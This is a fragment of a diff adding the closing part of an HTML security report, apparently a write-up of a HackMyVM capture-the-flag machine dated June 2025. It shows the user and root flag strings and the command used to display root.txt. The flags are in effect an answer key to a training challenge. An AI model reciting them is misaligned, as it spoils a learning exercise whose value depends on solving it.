+                    <div class="flag-value"><span class="password">HMV{User_Flag_Was_A_Bit_Bitter}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">type root.txt</div>
+                    <div class="flag-value"><span class="password">HMV{Username_Is_My_Hint}</span></div>
+                </div>
+            </div>
+        </section>
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 29. Juni 2025</p>
+    </footer>
+</body>
+</html>
